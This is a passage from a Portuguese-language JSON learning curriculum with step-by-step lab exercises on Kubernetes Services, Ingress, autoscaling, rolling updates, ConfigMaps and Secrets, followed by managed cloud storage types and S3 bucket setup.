                                "Deployment com réplicas corretas e Pods gerenciados.",
                                "Aplicação idempotente: reapply sem erros.",
                                "Describe mostra eventos sem falhas.",
                                "Scale altera réplicas instantaneamente.",
                                "Logs acessíveis sem erros."
                              ],
                              "assessmentCriteria": [
                                "YAML manifests sintaticamente corretos e sem erros de validação.",
                                "Pods e Deployments aplicados com sucesso e status healthy.",
                                "Comandos kubectl executados precisamente com outputs esperados.",
                                "Gerenciamento (scale, delete) funcional.",
                                "Identificação correta de problemas via describe/logs.",
                                "Limpeza completa de recursos."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines (GitHub Actions, Jenkins).",
                                "Programação: Automatização de manifests via Helm ou Kustomize.",
                                "Redes: Configuração de Services e Ingress para exposição.",
                                "Segurança: Aplicação de RBAC e Secrets em manifests."
                              ],
                              "realWorldApplication": "Em ambientes de produção, como e-commerces, Deployments gerenciam réplicas de microsserviços para alta disponibilidade, auto-scaling durante Black Friday, e monitoramento contínuo via kubectl ou dashboards como Lens/Dashboard para equipes DevOps."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.1.2"
                            ]
                          },
                          {
                            "id": "10.1.4.4.2.3",
                            "name": "Configurar Services e Ingress",
                            "description": "Criar services do tipo ClusterIP, NodePort e LoadBalancer para expor aplicações, e configurar Ingress para roteamento HTTP baseado em host ou path.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Criar um Deployment de Teste",
                                  "subSteps": [
                                    "Inicie um cluster Kubernetes local usando Minikube ou Kind.",
                                    "Crie um Deployment YAML simples para uma aplicação Nginx.",
                                    "Aplique o Deployment com 'kubectl apply -f deployment.yaml'.",
                                    "Verifique os pods rodando com 'kubectl get pods'.",
                                    "Escalone o Deployment para múltiplas réplicas."
                                  ],
                                  "verification": "Execute 'kubectl get deployments' e 'kubectl get pods' para confirmar que os pods estão no estado 'Running'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Minikube ou Kind instalado",
                                    "kubectl",
                                    "Editor de texto para YAML",
                                    "deployment-nginx.yaml"
                                  ],
                                  "tips": "Use 'kubectl apply' em vez de 'create' para idempotência; sempre verifique logs com 'kubectl logs' se algo falhar.",
                                  "learningObjective": "Entender como preparar um workload básico para exposição via Services.",
                                  "commonMistakes": [
                                    "Esquecer de definir imagePullPolicy",
                                    "Não especificar replicas",
                                    "Portas erradas no container"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Service ClusterIP",
                                  "subSteps": [
                                    "Crie um YAML para Service tipo ClusterIP apontando para o Deployment.",
                                    "Defina selector matching labels do Deployment e especifique porta targetPort.",
                                    "Aplique o Service com 'kubectl apply -f service-clusterip.yaml'.",
                                    "Teste acesso interno com 'kubectl port-forward service/nginx-clusterip 8080:80'.",
                                    "Verifique com 'kubectl get svc' e descreva o endpoint."
                                  ],
                                  "verification": "Acesse via port-forward (curl localhost:8080) e confirme resposta do Nginx; verifique endpoints com 'kubectl describe svc'.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "service-clusterip.yaml",
                                    "kubectl"
                                  ],
                                  "tips": "ClusterIP é interno; use selectors precisos para evitar matching incorreto.",
                                  "learningObjective": "Dominar exposição interna de pods via DNS no cluster.",
                                  "commonMistakes": [
                                    "Selector labels não matching",
                                    "Porta servicePort vs targetPort confundidas",
                                    "Namespace errado"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Services NodePort e LoadBalancer",
                                  "subSteps": [
                                    "Crie YAML para NodePort, definindo nodePort (ex: 30080).",
                                    "Aplique e teste acessando http://minikube-ip:30080.",
                                    "Crie YAML para LoadBalancer (em Minikube, use minikube tunnel).",
                                    "Aplique e verifique EXTERNAL-IP com 'kubectl get svc'.",
                                    "Compare acessos e comportamentos entre NodePort e LoadBalancer."
                                  ],
                                  "verification": "Acesse via nodePort e LoadBalancer IP; confirme balanceamento entre réplicas com curls repetidos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "service-nodeport.yaml",
                                    "service-loadbalancer.yaml",
                                    "Minikube tunnel"
                                  ],
                                  "tips": "NodePort usa portas altas (30000-32767); LoadBalancer requer cloud provider para IP externo real.",
                                  "learningObjective": "Diferenciar e implementar exposições externas via NodePort e LoadBalancer.",
                                  "commonMistakes": [
                                    "nodePort fora do range",
                                    "Esquecer tunnel no Minikube",
                                    "Não testar balanceamento"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Ingress para Roteamento HTTP",
                                  "subSteps": [
                                    "Instale um Ingress Controller (ex: Minikube addon enable ingress).",
                                    "Crie dois Deployments/services para hosts diferentes (app1.local, app2.local).",
                                    "Crie YAML Ingress com rules baseadas em host e path.",
                                    "Aplique Ingress e obtenha IP com 'minikube ip'.",
                                    "Edite /etc/hosts para mapear hosts locais e teste curl -H 'Host: app1.local'.",
                                    "Verifique logs do Ingress Controller."
                                  ],
                                  "verification": "Acese via browser/curl com hosts diferentes e confirme roteamento correto; 'kubectl describe ingress'.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "ingress.yaml",
                                    "Ingress Controller instalado",
                                    "/etc/hosts editor"
                                  ],
                                  "tips": "Sempre especifique className para controller; use annotations para TLS se avançado.",
                                  "learningObjective": "Implementar roteamento L7 avançado com Ingress.",
                                  "commonMistakes": [
                                    "Ingress class não matching controller",
                                    "Hosts não mapeados em /etc/hosts",
                                    "Paths sobrepostos"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma aplicação web com dois microsserviços (frontend em Nginx porta 80, backend API porta 8080). Crie ClusterIP para interno, NodePort/LoadBalancer para testes diretos, e Ingress para rotear frontend.com -> frontend, api.frontend.com -> backend, e /api/* -> backend.",
                              "finalVerifications": [
                                "Todos Services listados com status correto via 'kubectl get svc'.",
                                "Ingress rules ativas e roteando corretamente via curl com Host headers.",
                                "Tráfego balanceado entre réplicas em todos Services.",
                                "Port-forward e external access funcionais.",
                                "Descrições mostram endpoints corretos.",
                                "Cleanup possível com 'kubectl delete -f arquivos.yaml'."
                              ],
                              "assessmentCriteria": [
                                "YAMLs idempotentes e sem erros de sintaxe.",
                                "Seletores e ports corretamente configurados.",
                                "Testes de roteamento HTTP bem-sucedidos com múltiplos cenários.",
                                "Compreensão das diferenças entre tipos de Service.",
                                "Ingress com pelo menos duas rules (host/path).",
                                "Documentação de testes e verificações."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Conceitos de load balancing e roteamento L7.",
                                "DevOps/Cloud Computing: Integração com CI/CD e provedores cloud (AWS ELB, GCP Ingress).",
                                "Segurança da Informação: Configuração de TLS em Ingress.",
                                "Desenvolvimento Web: Exposição de APIs RESTful em microsserviços.",
                                "Gerenciamento de Infraestrutura: Uso de Helm para controllers."
                              ],
                              "realWorldApplication": "Em produção, Services LoadBalancer integram com cloud load balancers para alta disponibilidade; Ingress gerencia tráfego para microsserviços em e-commerces, permitindo roteamento por domínio (shop.example.com, api.example.com) e escalabilidade automática."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.2.2"
                            ]
                          },
                          {
                            "id": "10.1.4.4.2.4",
                            "name": "Escalabilidade e atualizações com Kubernetes",
                            "description": "Implementar Horizontal Pod Autoscaler (HPA), realizar rolling updates em deployments e gerenciar ConfigMaps e Secrets para configuração dinâmica.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Implementar Horizontal Pod Autoscaler (HPA)",
                                  "subSteps": [
                                    "Instale o Metrics Server no cluster Kubernetes para coletar métricas de CPU e memória.",
                                    "Crie um Deployment com réplicas iniciais e exponha via Service.",
                                    "Escreva um YAML para HPA especificando targetCPUUtilizationPercentage e min/max pods.",
                                    "Aplique o HPA com kubectl apply e teste com carga simulada usando ferramentas como hey ou Apache Bench.",
                                    "Monitore o escalonamento com kubectl get hpa e kubectl top pods."
                                  ],
                                  "verification": "Execute 'kubectl get hpa' e observe current/replicas ajustando-se automaticamente sob carga; confirme com logs de eventos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Cluster Kubernetes (Minikube ou Kind)",
                                    "kubectl",
                                    "Metrics Server",
                                    "Ferramenta de load testing (hey)",
                                    "Editor YAML"
                                  ],
                                  "tips": "Comece com targetCPUUtilizationPercentage em 50% para testes rápidos; use --dry-run=client para validar YAML antes de aplicar.",
                                  "learningObjective": "Configurar HPA para escalabilidade automática baseada em métricas de recursos.",
                                  "commonMistakes": [
                                    "Esquecer de instalar Metrics Server, causando 'unknown metrics'",
                                    "Definir minPods muito alto, impedindo downscale",
                                    "Não expor métricas no Deployment"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar Rolling Updates em Deployments",
                                  "subSteps": [
                                    "Crie um Deployment YAML com image inicial (ex: nginx:1.14).",
                                    "Configure strategy: type: RollingUpdate com maxUnavailable e maxSurge.",
                                    "Aplique o Deployment e verifique status com kubectl rollout status.",
                                    "Atualize a image para versão nova (ex: nginx:1.21) via kubectl set image ou edit YAML.",
                                    "Monitore o rollout com kubectl rollout history e rollback se necessário.",
                                    "Teste zero-downtime acessando o Service durante o update."
                                  ],
                                  "verification": "'kubectl rollout status deployment/<nome>' retorna 'success'; verifique pods rodando nova image sem downtime no endpoint.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Cluster Kubernetes",
                                    "kubectl",
                                    "Deployment YAML template",
                                    "Browser ou curl para testar Service"
                                  ],
                                  "tips": "Use maxUnavailable: 25% para clusters pequenos; pause rollout com 'kubectl rollout pause' para inspeção.",
                                  "learningObjective": "Executar atualizações sem interrupção mantendo disponibilidade da aplicação.",
                                  "commonMistakes": [
                                    "Não configurar readinessProbe, causando falhas em health checks",
                                    "Image pull policy errada levando a ImagePullBackOff",
                                    "maxSurge muito alto sobrecarregando cluster"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerenciar ConfigMaps para Configuração Dinâmica",
                                  "subSteps": [
                                    "Crie um ConfigMap YAML com dados de configuração (ex: chaves-valor para app settings).",
                                    "Aplique o ConfigMap e liste com kubectl get configmap.",
                                    "Modifique o Deployment para montar ConfigMap como volume ou env vars.",
                                    "Teste injetando config no pod e verificando com kubectl exec.",
                                    "Atualize o ConfigMap e observe propagação automática nos pods.",
                                    "Use kubectl create configmap --from-literal ou --from-file para criação rápida."
                                  ],
                                  "verification": "kubectl exec no pod mostra env vars ou arquivos do ConfigMap corretos; update reflete em <1min.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "kubectl",
                                    "ConfigMap YAML",
                                    "Deployment com volumeMount",
                                    "Aplicação de teste que lê config (ex: env print)"
                                  ],
                                  "tips": "Prefira envFrom para simplicidade; use subPath para mounts seletivos.",
                                  "learningObjective": "Gerenciar configurações não-sensíveis de forma desacoplada e atualizável.",
                                  "commonMistakes": [
                                    "Nomear ConfigMap errado no volumeMount",
                                    "Não restartar pods após update (use update strategy)",
                                    "Configurar como Secret por engano"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar Secrets para Dados Sensíveis",
                                  "subSteps": [
                                    "Crie um Secret YAML com dados base64-encoded (ex: DB_PASSWORD).",
                                    "Aplique e liste secrets com kubectl get secrets (use -o yaml para inspecionar).",
                                    "Atualize Deployment para referenciar Secret como env ou volume.",
                                    "Teste decodificação no pod com kubectl exec e cat /mount/secret.",
                                    "Rotacione o Secret atualizando valor e reaplicando, verificando propagação.",
                                    "Use kubectl create secret generic ou docker-registry para auth."
                                  ],
                                  "verification": "Pod acessa Secret corretamente via env/logs; 'kubectl get secret <nome> -o yaml' confirma dados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "kubectl",
                                    "Base64 encoder",
                                    "Secret YAML template",
                                    "Deployment com secretRef"
                                  ],
                                  "tips": "Nunca commite secrets em Git; use sealed-secrets ou external vaults para prod.",
                                  "learningObjective": "Armazenar e injetar credenciais seguras em aplicações Kubernetes.",
                                  "commonMistakes": [
                                    "Esquecer base64 encode, causando valores errados",
                                    "Expor Secret em logs via debug prints",
                                    "Não usar readOnly: true em volumes"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma API Node.js simples que lê config de DB de ConfigMap/Secret e expõe /health. Deploy com 2 réplicas, adicione HPA (CPU 60%), faça rolling update para v2 com nova feature, teste escalonamento com 1000 req/s e verifique zero-downtime + config dinâmica alterando DB host via ConfigMap.",
                              "finalVerifications": [
                                "HPA escala pods de 2 para 5+ sob carga e downscale após.",
                                "Rolling update completa sem downtime (curl Service 100x durante process).",
                                "ConfigMap update propaga para todos pods em <2min sem restart.",
                                "Secrets montados corretamente e legíveis apenas no pod runtime.",
                                "Cluster events mostram zero erros relacionados (kubectl get events).",
                                "Aplicação responde corretamente com configs atualizadas."
                              ],
                              "assessmentCriteria": [
                                "YAMLs validados sem erros de sintaxe (kubectl apply --dry-run).",
                                "Comportamento observado matches specs (escalonamento, updates, mounts).",
                                "Zero violações de segurança (secrets não expostos).",
                                "Eficiência: updates rápidos, recursos otimizados.",
                                "Documentação: anotações em YAML explicando choices.",
                                "Testes end-to-end automatizados via script bash."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD (ArgoCD, Flux para GitOps updates).",
                                "Segurança da Informação: RBAC para acesso a Secrets/ConfigMaps.",
                                "Cloud Computing: HPA em managed K8s (EKS, GKE autoscaling groups).",
                                "Desenvolvimento de Software: Observability com Prometheus para métricas HPA.",
                                "Administração de Sistemas: Logging com ELK para monitorar updates."
                              ],
                              "realWorldApplication": "Em plataformas como Netflix ou Spotify, HPA gerencia picos de tráfego (ex: lançamentos), rolling updates deployam fixes sem perda de usuários, e ConfigMaps/Secrets permitem configs por ambiente (dev/staging/prod) com DB creds rotacionados automaticamente, garantindo alta disponibilidade 99.99%."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.2.2"
                            ]
                          },
                          {
                            "id": "10.1.4.4.2.5",
                            "name": "Deploy de aplicação completa em Kubernetes",
                            "description": "Orquestrar um deploy full-stack com frontend, backend e banco em containers Docker, utilizando namespaces, labels e selectors para organização.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Containerizar a aplicação full-stack com Docker",
                                  "subSteps": [
                                    "Criar Dockerfile para o frontend (ex: React app)",
                                    "Criar Dockerfile para o backend (ex: Node.js/Express)",
                                    "Criar Dockerfile ou imagem oficial para o banco de dados (ex: MongoDB)",
                                    "Construir e testar imagens localmente com docker build e docker run",
                                    "Publicar imagens em um registry (ex: Docker Hub ou local)"
                                  ],
                                  "verification": "Executar 'docker images' para listar imagens e 'docker run' para testar cada container isoladamente",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Docker instalado",
                                    "Código fonte da app full-stack",
                                    "Docker Hub account"
                                  ],
                                  "tips": [
                                    "Use multi-stage builds para otimizar tamanho das imagens",
                                    "Defina variáveis de ambiente para conexões (ex: DB_URL)"
                                  ],
                                  "learningObjective": "Dominar a criação de imagens Docker leves e funcionais para componentes de uma aplicação full-stack",
                                  "commonMistakes": [
                                    "Expor portas desnecessárias no Dockerfile",
                                    "Não copiar apenas arquivos necessários (leva a imagens grandes)",
                                    "Ignorar .dockerignore"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar manifests Kubernetes para Deployments e Services",
                                  "subSteps": [
                                    "Definir Deployment YAML para frontend com réplicas e probes de health",
                                    "Definir Deployment YAML para backend com variáveis de ambiente para DB",
                                    "Definir StatefulSet ou Deployment para banco com PersistentVolumeClaim (PVC)",
                                    "Criar Service YAML para cada componente (ClusterIP para backend/DB, LoadBalancer/NodePort para frontend)",
                                    "Validar sintaxe dos YAMLs com 'kubectl apply --dry-run=client'"
                                  ],
                                  "verification": "'kubectl apply --dry-run=server -f manifests/' sem erros e 'kubectl get deployments --dry-run=client'",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "kubectl instalado",
                                    "Editor YAML (VS Code com Kubernetes extension)",
                                    "Minikube ou Kind para cluster local"
                                  ],
                                  "tips": [
                                    "Use templates Helm ou Kustomize para gerenciar múltiplos YAMLs",
                                    "Configure readiness e liveness probes para restarts automáticos"
                                  ],
                                  "learningObjective": "Estruturar recursos Kubernetes declarativos para aplicações stateless e stateful",
                                  "commonMistakes": [
                                    "Esquecer imagePullPolicy: Always para imagens custom",
                                    "Portas erradas em Services",
                                    "Não definir requests/limits de recursos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Namespace, Labels e Selectors",
                                  "subSteps": [
                                    "Criar namespace 'app-fullstack' com 'kubectl create namespace'",
                                    "Adicionar labels aos Deployments (ex: app=frontend, tier=frontend, version=v1)",
                                    "Configurar selectors nos Services para matching correto com labels dos pods",
                                    "Aplicar network policies opcionais para isolar tráfego entre tiers",
                                    "Anotar recursos com metadados para organização (ex: owner=equipe-dev)"
                                  ],
                                  "verification": "'kubectl get pods -n app-fullstack --show-labels' mostra labels corretos e 'kubectl describe service' confirma selectors",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Cluster Kubernetes rodando (Minikube)",
                                    "kubectl com contexto correto"
                                  ],
                                  "tips": [
                                    "Labels devem ser únicos por tier para evitar conflitos",
                                    "Use label selectors em Rollout para atualizações controladas"
                                  ],
                                  "learningObjective": "Organizar recursos em namespaces e usar labels/selectors para gerenciamento lógico e seleção precisa",
                                  "commonMistakes": [
                                    "Labels inconsistentes entre Deployment e Service",
                                    "Namespace não especificado nos applies",
                                    "Overuse de labels levando a complexidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Deploy e Verificar Funcionamento Completo",
                                  "subSteps": [
                                    "Aplicar todos manifests no namespace: 'kubectl apply -f manifests/ -n app-fullstack'",
                                    "Monitorar rollout com 'kubectl rollout status deployment/frontend -n app-fullstack'",
                                    "Expor frontend com port-forward ou Ingress",
                                    "Testar end-to-end: acessar frontend, criar dados que persistem no DB via backend",
                                    "Logs e troubleshooting: 'kubectl logs pod-name -n app-fullstack'"
                                  ],
                                  "verification": "'kubectl get all -n app-fullstack' mostra todos recursos Running e curl/port-forward acessa a app funcional",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Cluster ativo",
                                    "Ferramentas de teste (curl, Postman)"
                                  ],
                                  "tips": [
                                    "Use 'kubectl wait' para automação de verificações",
                                    "Monitore com 'kubectl top pods' para performance"
                                  ],
                                  "learningObjective": "Orquestrar deploys completos e diagnosticar issues em ambientes containerizados",
                                  "commonMistakes": [
                                    "Ordem errada de apply (DB antes de backend)",
                                    "Port-forward esquecido para testes locais",
                                    "Ignorar eventos com 'kubectl get events'"
                                  ]
                                }
                              ],
                              "practicalExample": "Containerize uma app TODO: React frontend (porta 3000), Node/Express backend (porta 5000 conectando a MongoDB porta 27017). Crie Deployment com 2 réplicas frontend, StatefulSet para Mongo com PVC 5Gi, Services ClusterIP para backend/DB, LoadBalancer para frontend. Use namespace 'todo-prod', labels 'app=todo-frontend tier=fe'. Acesse via minikube service frontend e crie tarefas que persistem.",
                              "finalVerifications": [
                                "Todos pods em status Running sem restarts excessivos",
                                "Services resolvem corretamente via selectors/labels",
                                "Persistência de dados: reiniciar pod DB e dados mantidos",
                                "End-to-end: frontend chama backend que persiste no DB",
                                "Namespace isolado: recursos não visíveis fora dele",
                                "Logs limpos sem erros de conexão ou autenticação"
                              ],
                              "assessmentCriteria": [
                                "Aplicação full-stack acessível e funcional end-to-end",
                                "Uso correto de namespaces para isolamento",
                                "Labels e selectors aplicados consistentemente em todos recursos",
                                "Configuração de persistência (PVC) para componentes stateful",
                                "Health checks (probes) definidos para confiabilidade",
                                "Recursos otimizados (requests/limits) sem overprovisioning"
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines (GitHub Actions, Jenkins)",
                                "Segurança: Network Policies e RBAC em Kubernetes",
                                "Cloud Computing: Migração para provedores gerenciados (EKS, GKE)",
                                "Gestão de Infraestrutura: IaC com Terraform/Helm",
                                "Monitoramento: Integração com Prometheus/Grafana"
                              ],
                              "realWorldApplication": "Em produção, como na Nubank ou iFood, deploys full-stack em K8s com namespaces por ambiente (dev/staging/prod), labels para auto-scaling (HPA), selectors para traffic splitting (Istio), garantindo alta disponibilidade, zero-downtime updates e gerenciamento de milhares de microsserviços."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.1.4",
                              "10.1.4.4.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.5",
                    "name": "Serviços Gerenciados na Nuvem",
                    "description": "Uso de storage, bancos de dados e compute services para aplicações escaláveis.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.5.1",
                        "name": "Serviços de Armazenamento Gerenciados",
                        "description": "Serviços de storage na nuvem que oferecem armazenamento escalável, durável e gerenciado, incluindo object storage (como S3), block storage (como EBS) e file storage (como EFS), ideais para aplicações web e móveis que precisam de alta disponibilidade e integração automática.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.1.1",
                            "name": "Identificar e comparar tipos de serviços de storage gerenciados",
                            "description": "Diferenciar object storage (não estruturado, escalável para big data), block storage (para volumes de VM) e file storage (para compartilhamento POSIX), considerando casos de uso como hospedagem de arquivos estáticos em aplicações web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Fundamentais de Cada Tipo de Storage Gerenciado",
                                  "subSteps": [
                                    "Pesquise definições oficiais: Object Storage (ex: AWS S3) para dados não estruturados como imagens e vídeos.",
                                    "Estude Block Storage (ex: AWS EBS) como armazenamento em blocos para volumes de VMs, simulando discos rígidos.",
                                    "Analise File Storage (ex: AWS EFS) para compartilhamento de arquivos via protocolo POSIX em múltiplas instâncias.",
                                    "Identifique características chave: escalabilidade, estrutura de dados e acesso.",
                                    "Crie um mapa mental comparando os três tipos em termos de estrutura de dados."
                                  ],
                                  "verification": "Crie um resumo de uma página listando definições e características únicas de cada tipo; revise se cobre não estruturado, blocos e POSIX.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação AWS S3, EBS, EFS",
                                    "Notebook ou ferramenta de mind mapping como Draw.io"
                                  ],
                                  "tips": [
                                    "Use analogias: Object como armário de objetos soltos, Block como HD particionado, File como pasta compartilhada."
                                  ],
                                  "learningObjective": "Diferenciar conceitualmente object, block e file storage com base em estrutura e acesso.",
                                  "commonMistakes": [
                                    "Confundir object com file storage por ambos lidarem com arquivos; lembrar que object não suporta hierarquia POSIX nativa."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Comparar Características Técnicas e Desempenho",
                                  "subSteps": [
                                    "Liste métricas chave: durabilidade (99.999999999% para object), latência (baixa para block em IOPS), throughput (alto para file em NFS).",
                                    "Compare escalabilidade: object escala para petabytes automaticamente, block limitado por volume, file escala com nós.",
                                    "Analise custos: object mais barato para armazenamento frio, block por GB provisionado, file por uso compartilhado.",
                                    "Crie uma tabela comparativa com colunas para acesso (HTTP/REST vs iSCSI vs NFS), consistência e redundância.",
                                    "Simule cenários de falha: como cada tipo lida com perda de dados ou alta demanda."
                                  ],
                                  "verification": "Construa e preencha uma tabela de comparação com pelo menos 5 métricas; valide contra documentação oficial.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou Excel",
                                    "Documentação oficial de provedores cloud (AWS, Azure, GCP)"
                                  ],
                                  "tips": [
                                    "Foque em APIs: object usa REST, block iSCSI, file NFS/SMB para diferenciar integrações."
                                  ],
                                  "learningObjective": "Identificar diferenças técnicas que impactam desempenho e custo em cenários reais.",
                                  "commonMistakes": [
                                    "Ignorar latência: block é ideal para bancos de dados, não para big data estático."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Casos de Uso e Seleção Adequada",
                                  "subSteps": [
                                    "Mapeie casos: object para big data/backups (ex: hospedagem de arquivos estáticos em web apps).",
                                    "Atribua block para workloads de VM como bancos de dados relacionais ou SO bootável.",
                                    "Defina file para compartilhamento multi-VM como CMS ou home directories em clusters.",
                                    "Avalie trade-offs: quando migrar de file para object para escalabilidade infinita.",
                                    "Crie fluxograma de decisão baseado em requisitos (estrutura, escala, acesso simultâneo)."
                                  ],
                                  "verification": "Desenvolva um fluxograma que direcione a escolha de storage baseado em 3-5 critérios; teste com 2 cenários hipotéticos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramenta de fluxograma como Lucidchart ou papel/caneta",
                                    "Exemplos de casos de uso de blogs cloud"
                                  ],
                                  "tips": [
                                    "Pergunte: 'Preciso de montagem como disco?' -> Block; 'Acesso web global?' -> Object."
                                  ],
                                  "learningObjective": "Selecionar o storage gerenciado correto baseado em casos de uso específicos.",
                                  "commonMistakes": [
                                    "Usar block para arquivos estáticos: caro e não escalável; prefira object."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Conhecimento em um Cenário Prático de Aplicação Web",
                                  "subSteps": [
                                    "Escolha um app web: hospedagem de imagens estáticas para um site de e-commerce.",
                                    "Justifique object storage (S3): escalável, CDN integration, baixo custo.",
                                    "Compare alternativas: por que não block (não compartilhado) ou file (overkill para read-only).",
                                    "Simule configuração: crie buckets virtuais e teste upload via CLI.",
                                    "Documente prós/contras em um relatório curto."
                                  ],
                                  "verification": "Escreva um relatório de 300 palavras justificando a escolha para o cenário; inclua tabela de comparação.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "AWS Free Tier CLI ou console simulado",
                                    "Editor de texto"
                                  ],
                                  "tips": [
                                    "Integre com CloudFront para CDN em object storage para performance global."
                                  ],
                                  "learningObjective": "Aplicar comparação de storages a um caso real de desenvolvimento web na nuvem.",
                                  "commonMistakes": [
                                    "Esquecer versioning e lifecycle policies em object para gerenciamento de custos."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de galeria de fotos, use Object Storage (S3) para hospedar imagens estáticas: upload via SDK, serve via URL pública com CDN, escalando para milhões de acessos sem provisionar volumes.",
                              "finalVerifications": [
                                "Liste corretamente 3 diferenças chave entre object, block e file storage.",
                                "Explique por que object é ideal para arquivos estáticos em web apps.",
                                "Crie uma tabela comparativa precisa com pelo menos 4 métricas.",
                                "Identifique 2 casos de uso para cada tipo sem erros.",
                                "Justifique escolha de storage para um cenário dado com trade-offs.",
                                "Descreva protocolos de acesso (REST, iSCSI, NFS) corretamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições e diferenças sem confusões (30%).",
                                "Completude da comparação: cobertura de escalabilidade, custo, desempenho (25%).",
                                "Relevância de casos de uso: alinhamento com exemplos reais (20%).",
                                "Clareza na justificativa: fluxogramas ou tabelas bem estruturados (15%).",
                                "Aplicação prática: integração com cenários web/cloud (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Integração com CDNs e protocolos HTTP para object storage.",
                                "Segurança: Políticas IAM, encryption e acesso público/privado em storages.",
                                "Desenvolvimento de Software: SDKs para upload/download em apps web.",
                                "Gerenciamento de Custos: Otimização com tiers de storage e lifecycle rules.",
                                "Big Data: Object storage como base para analytics com Athena/Glue."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam Object Storage (S3) para streaming de vídeos estáticos, Block para EC2 de processamento e File para shares em render farms, otimizando custos e escala global."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.1.2",
                            "name": "Configurar um bucket de object storage",
                            "description": "Criar, configurar políticas de acesso (IAM), versionamento e lifecycle policies em um serviço como AWS S3 ou Azure Blob Storage, garantindo segurança e custo-otimização para aplicações escaláveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar um bucket S3 básico",
                                  "subSteps": [
                                    "Acesse o AWS Management Console e navegue até o serviço S3.",
                                    "Clique em 'Create bucket' e insira um nome único global (ex: meu-bucket-unico-2024).",
                                    "Selecione a região apropriada baseada na latência e conformidade (ex: us-east-1).",
                                    "Desabilite 'Block all public access' inicialmente para testes, mas planeje segurança posterior.",
                                    "Revise e clique em 'Create bucket'."
                                  ],
                                  "verification": "Verifique no console S3 se o bucket aparece na lista com status 'Available'.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Conta AWS (Free Tier recomendada)",
                                    "Navegador web atualizado"
                                  ],
                                  "tips": "Escolha nomes lowercase com hifens para compatibilidade; evite underscores.",
                                  "learningObjective": "Entender os requisitos de nomenclatura e configuração inicial de um bucket S3.",
                                  "commonMistakes": [
                                    "Nome de bucket não único (erro comum)",
                                    "Região errada impactando custos/latência",
                                    "Não planejar ACLs desde o início"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar políticas de acesso IAM e Bucket Policies",
                                  "subSteps": [
                                    "No IAM Console, crie uma política JSON permitindo ações específicas como s3:PutObject em recursos do bucket.",
                                    "Anexe a política a um usuário ou role IAM relevante (ex: developer-role).",
                                    "No bucket S3, edite 'Permissions' > 'Bucket policy' e adicione uma policy deny-all exceto para IAM authenticated users.",
                                    "Teste upload/download via AWS CLI com credenciais IAM: aws s3 cp arquivo s3://meu-bucket/.",
                                    "Habilite MFA Delete se necessário para proteção extra."
                                  ],
